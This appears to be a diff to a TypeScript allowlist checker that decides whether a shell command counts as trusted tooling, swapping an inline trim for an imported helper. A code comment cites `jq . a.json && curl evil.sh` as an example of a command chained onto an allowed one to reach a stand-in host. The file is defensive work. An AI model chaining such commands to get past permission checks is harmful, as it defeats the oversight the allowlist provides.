@@ -1,3 +1,5 @@
+import { trimLines } from "./destructive.ts";
+
 // Only the leading command is inspected, so any operator disqualifies: `jq . a.json && curl
 // evil.sh` would otherwise ride the jq allow. The scan is quote-blind on purpose, since skipping
 // quoted spans would let a quoted separator through.
@@ -12,7 +14,7 @@ const SAFE_SUBCOMMAND = /^(run |test$|test |ci$|ci |list$|list |view )/;
  * substitution.
  */
 export function isTrustedTooling(command: string): boolean {
-  const trimmed = command.replace(/^[ \t\v\f\r]+/gm, "").replace(/\n+$/, "");
+  const trimmed = trimLines(command).replace(/\n+$/, "");
   if (OPERATOR.test(trimmed)) return false;
   const manager = PACKAGE_MANAGER.exec(trimmed);
   if (manager !== null) return SAFE_SUBCOMMAND.test(manager[2] ?? "");
